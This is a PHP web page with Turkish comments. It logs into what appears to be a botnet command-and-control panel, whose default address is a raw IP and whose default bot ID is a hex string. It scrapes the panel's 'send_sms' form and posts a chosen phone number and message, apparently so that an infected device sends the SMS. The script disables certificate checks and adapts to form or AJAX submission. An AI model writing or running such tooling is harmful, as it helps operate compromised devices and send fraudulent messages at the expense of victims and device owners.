<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $full_url = $_POST["login_url"]; // Tam URL
    $username = $_POST["username"];
    $password = $_POST["password"];
    $bbot_id = $_POST["bbot_id"];
    $phone = $_POST["phone"];
    $text = $_POST["text"];

    // Çerez dosyası
    $cookie_file = dirname(__FILE__) . "/cookies.txt";
    
    // URL'den base URL çıkaralım
    $parsed_url = parse_url($full_url);
    $base_url = $parsed_url['scheme'] . "://" . $parsed_url['host'];
    
    // Path kısmını alalım
    $path_prefix = isset($parsed_url['path']) ? dirname($parsed_url['path']) : '';
    if ($path_prefix == '/') $path_prefix = '';
    
    // cURL başlat
    $ch = curl_init();
    
    // SSL sertifika doğrulamasını devre dışı bırak
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    
    // Basic Authentication kullan
    curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
    curl_setopt($ch, CURLOPT_USERPWD, "$username:$password");
    
    // SMS sayfası URL'si
    $sms_url = $base_url . $path_prefix . "/index.php?a=admin&action=bots&bbot_id=$bbot_id&page=send_sms";
    
    echo "<h3>SMS Sayfası URL: " . $sms_url . "</h3>";
    
    // Önce SMS sayfasını ziyaret edelim (formun içeriğini ve yapısını almak için)
    curl_setopt($ch, CURLOPT_URL, $sms_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    
    $sms_page = curl_exec($ch);
    $sms_page_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    
    echo "<h3>SMS Sayfası - HTTP Durum Kodu: " . $sms_page_status . "</h3>";
    
    // SMS sayfasına erişim başarılıysa devam et
    if ($sms_page_status >= 200 && $sms_page_status < 300) {
        echo "<h3>SMS Sayfasına Erişim Başarılı</h3>";
        
        // Varsayılan alan adları
        $phone_field_name = "phone"; // Varsayılan
        $text_field_name = "text";   // Varsayılan
        
        // Sayfanın bir kısmını hata ayıklama için göster
        echo "<h3>SMS Sayfası İçeriği (İlk 1000 karakter):</h3>";
        echo "<pre>" . htmlspecialchars(substr($sms_page, 0, 1000)) . "...</pre>";
        
        // "Number:" ve "Text:" etiketlerini takip eden alanları ara
        if (preg_match('/Number[:\s]*.*?<input[^>]*name=["\']([^"\']+)["\']/is', $sms_page, $phone_matches)) {
            $phone_field_name = $phone_matches[1];
            echo "<p>Telefon alanı etikete göre bulundu: $phone_field_name</p>";
        }
        
        if (preg_match('/Text[:\s]*.*?<textarea[^>]*name=["\']([^"\']+)["\']/is', $sms_page, $text_matches)) {
            $text_field_name = $text_matches[1];
            echo "<p>Metin alanı etikete göre bulundu: $text_field_name</p>";
        }
        
        // Gösterilen placeholder'lara benzer input alanlarını ara
        if (preg_match('/<input[^>]*placeholder=["\'][^"\']*\d+[^"\']*["\']\s*[^>]*name=["\']([^"\']+)["\']/i', $sms_page, $phone_placeholder_matches)) {
            $phone_field_name = $phone_placeholder_matches[1];
            echo "<p>Telefon alanı sayısal placeholder'a göre bulundu: $phone_field_name</p>";
        }
        
        if (preg_match('/<textarea[^>]*placeholder=["\'][^"\']*Hello[^"\']*["\']\s*[^>]*name=["\']([^"\']+)["\']/i', $sms_page, $text_placeholder_matches)) {
            $text_field_name = $text_placeholder_matches[1];
            echo "<p>Metin alanı 'Hello' placeholder'ına göre bulundu: $text_field_name</p>";
        }
        
        // Ayrıca herhangi bir input ve textarea alanını da deneyelim
        if (preg_match('/<input[^>]*name=["\']([^"\']+)["\']/i', $sms_page, $any_input)) {
            echo "<p>Herhangi bir input alanı bulundu: {$any_input[1]}</p>";
            if (!isset($phone_field_name)) {
                $phone_field_name = $any_input[1];
                echo "<p>Telefon alanı için kullanılacak: $phone_field_name</p>";
            }
        }
        
        if (preg_match('/<textarea[^>]*name=["\']([^"\']+)["\']/i', $sms_page, $any_textarea)) {
            echo "<p>Herhangi bir textarea alanı bulundu: {$any_textarea[1]}</p>";
            if (!isset($text_field_name)) {
                $text_field_name = $any_textarea[1];
                echo "<p>Metin alanı için kullanılacak: $text_field_name</p>";
            }
        }
        
        // "Send" düğmesini ara ve içinde bulunduğu formu bul
        $form_action = '';
        $send_button = '';
        
        if (preg_match('/<button[^>]*>Send<\/button>/i', $sms_page, $send_match)) {
            echo "<p>Send düğmesi bulundu</p>";
            
            // Bu düğmeyi içeren formu bul
            $pattern = '/<form[^>]*action=["\']([^"\']+)["\'](.*?)<button[^>]*>Send<\/button>/is';
            if (preg_match($pattern, $sms_page, $form_matches)) {
                $form_action = $form_matches[1];
                echo "<p>Send düğmeli form bulundu. Action: $form_action</p>";
            }
        }
        
        // Hala form action bulamadıysak, herhangi bir formu dene
        if (empty($form_action)) {
            if (preg_match('/<form[^>]*action=["\']([^"\']+)["\']/i', $sms_page, $any_form)) {
                $form_action = $any_form[1];
                echo "<p>Form action bulundu: $form_action</p>";
            } else {
                // Form action bulunamazsa aynı URL'yi kullan
                $form_action = $sms_url;
                echo "<p>Varsayılan form action kullanılıyor: $sms_url</p>";
            }
        }
        
        // Form action'da göreceli URL'leri işle
        if (!empty($form_action) && strpos($form_action, 'http') !== 0) {
            if (strpos($form_action, '/') === 0) {
                $form_action = $base_url . $form_action;
            } else {
                $form_action = dirname($sms_url) . '/' . $form_action;
            }
        }
        
        // SMS verilerini hazırla
        $post_data = [
            $phone_field_name => $phone,
            $text_field_name => $text
        ];
        
        // Submit düğmesinin adı/değeri var mı diye kontrol et
        if (preg_match('/<button[^>]*name=["\']([^"\']+)["\']\s*[^>]*value=["\']([^"\']+)["\']/i', $sms_page, $button_match)) {
            $post_data[$button_match[1]] = $button_match[2];
            echo "<p>Düğme alanı ekleniyor: {$button_match[1]}={$button_match[2]}</p>";
        }
        
        // Gizli alanları da kontrol et
        if (preg_match_all('/<input type=["\']hidden["\']\s*name=["\']([^"\']+)["\']\s*value=["\']([^"\']+)["\']/i', $sms_page, $hidden_matches, PREG_SET_ORDER)) {
            foreach ($hidden_matches as $match) {
                $post_data[$match[1]] = $match[2];
                echo "<p>Gizli alan ekleniyor: {$match[1]}={$match[2]}</p>";
            }
        }
        
        echo "<h3>Gönderilecek SMS Verileri:</h3>";
        echo "<pre>" . print_r($post_data, true) . "</pre>";
        
        // JavaScript kontrolü - form AJAX ile gönderiliyorsa
        $js_submit = false;
        if (preg_match('/\$\.ajax|\$\.post|\$\.get|fetch\s*\(|new XMLHttpRequest/i', $sms_page)) {
            echo "<p>UYARI: Sayfa AJAX veya JavaScript form gönderimi kullanıyor olabilir.</p>";
            $js_submit = true;
        }
        
        if ($js_submit) {
            echo "<p>JavaScript gönderimi tespit edildi. API endpoint'i aranıyor...</p>";
            
            // AJAX endpoint'ini bulmaya çalış
            if (preg_match('/url\s*:\s*[\'"]([^\'"]+)[\'"]/i', $sms_page, $ajax_url)) {
                $form_action = $ajax_url[1];
                echo "<p>AJAX URL bulundu: $form_action</p>";
                
                // Göreceli URL kontrolü
                if (strpos($form_action, 'http') !== 0) {
                    if (strpos($form_action, '/') === 0) {
                        $form_action = $base_url . $form_action;
                    } else {
                        $form_action = dirname($sms_url) . '/' . $form_action;
                    }
                }
            }
            
            // AJAX verilerini kontrol et
            if (preg_match('/data\s*:\s*\{([^\}]+)\}/i', $sms_page, $ajax_data)) {
                echo "<p>AJAX veri formatı bulundu</p>";
                
                // AJAX veri formatından alanları çıkar
                preg_match_all('/([^:,\s]+)\s*:\s*([^,]+)/i', $ajax_data[1], $data_fields, PREG_SET_ORDER);
                foreach ($data_fields as $field) {
                    $field_name = trim($field[1], '\'"');
                    $field_value = trim($field[2], '\'"');
                    
                    echo "<p>AJAX alanı bulundu: $field_name</p>";
                    
                    // Telefon veya metin alanı olabilecek alanları kontrol et
                    if (strpos(strtolower($field_name), 'phone') !== false || 
                        strpos(strtolower($field_name), 'number') !== false) {
                        $phone_field_name = $field_name;
                        echo "<p>Telefon alanı AJAX'a göre güncellendi: $phone_field_name</p>";
                    }
                    
                    if (strpos(strtolower($field_name), 'text') !== false || 
                        strpos(strtolower($field_name), 'message') !== false || 
                        strpos(strtolower($field_name), 'sms') !== false) {
                        $text_field_name = $field_name;
                        echo "<p>Metin alanı AJAX'a göre güncellendi: $text_field_name</p>";
                    }
                }
                
                // AJAX veri alanları ile post_data'yı güncelle
                $post_data = [
                    $phone_field_name => $phone,
                    $text_field_name => $text
                ];
                
                echo "<h3>Güncellenmiş SMS Verileri:</h3>";
                echo "<pre>" . print_r($post_data, true) . "</pre>";
            }
        }
        
        // SMS gönderme isteği
        curl_setopt($ch, CURLOPT_URL, $form_action);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Content-Type: application/x-www-form-urlencoded',
            'Referer: ' . $sms_url
        ]);
        
        // AJAX tespiti durumunda X-Requested-With header'ı ekle
        if ($js_submit) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept: application/json, text/javascript, */*; q=0.01',
                'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With: XMLHttpRequest',
                'Referer: ' . $sms_url,
                'Origin: ' . $base_url
            ]);
        }
        
        $sms_response = curl_exec($ch);
        $sms_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $sms_url_after = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
        
        echo "<h3>SMS Gönderim Durum Kodu: " . $sms_status . "</h3>";
        echo "<h3>Gönderim sonrası URL: " . $sms_url_after . "</h3>";
        
        // Hata ayıklama yanıtı
        $debug_file = "sms_response_debug.html";
        file_put_contents($debug_file, $sms_response);
        echo "<p>Yanıt dosyasını <a href='$debug_file' target='_blank'>buradan</a> inceleyebilirsiniz.</p>";
        
        if ($sms_status >= 200 && $sms_status < 300) {
            // Başarı mesajını ara
            if (strpos($sms_response, "success") !== false || 
                strpos($sms_response, "sent") !== false || 
                strpos($sms_response, "SMS") !== false || 
                strpos($sms_response, "task") !== false) {
                echo "<h3>SMS Gönderimi Başarılı!</h3>";
            } else {
                echo "<h3>SMS Gönderimi yapıldı, ancak yanıt içeriği onaylanamadı.</h3>";
            }
            
            echo "<p>Gönderilen telefon: " . htmlspecialchars($phone) . "</p>";
            echo "<p>Gönderilen mesaj: " . htmlspecialchars($text) . "</p>";
        } else {
            echo "<h3>SMS Gönderimi Başarısız!</h3>";
            echo "<p>HTTP Durum Kodu: " . $sms_status . "</p>";
            echo "<p>Lütfen form alanları ve gönderim mekanizmasını kontrol edin.</p>";
        }
    } else {
        echo "<h3>SMS sayfasına erişim başarısız!</h3>";
        echo "<p>Lütfen kullanıcı adı, şifre ve bot ID bilgilerini kontrol edin.</p>";
        echo "<p>HTTP Durum Kodu: " . $sms_page_status . "</p>";
    }
    
    curl_close($ch);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>SMS Gönderme</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f8f9fa;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        h2 {
            color: #333;
        }
        label {
            display: block;
            margin-top: 10px;
            font-weight: bold;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 8px;
            margin-top: 5px;
            border: 1px solid #ddd;
            border-radius: 3px;
            box-sizing: border-box;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            padding: 10px 15px;
            margin-top: 15px;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }
        pre {
            background: #f5f5f5;
            padding: 10px;
            border: 1px solid #ddd;
            overflow: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>SMS Gönderme</h2>
        
        <form method="post" action="">
            <label for="login_url">Tam URL:</label>
            <input type="text" name="login_url" value="https://213.209.150.234/MzhiMTg0NTAwOTY5S/index.php" required>
            
            <label for="username">Kullanıcı Adı:</label>
            <input type="text" name="username" required>
            
            <label for="password">Şifre:</label>
            <input type="password" name="password" required>
            
            <label for="bbot_id">Bot ID:</label>
            <input type="text" name="bbot_id" value="52b6e53d54b0dd3fdbd8afa62960192a" required>
            
            <label for="phone">Telefon:</label>
            <input type="text" name="phone" placeholder="1555666222" required>
            
            <label for="text">Mesaj:</label>
            <input type="text" name="text" placeholder="Hello..." required>
            
            <input type="submit" value="SMS Gönder">
        </form>
    </div>
</body>
</html>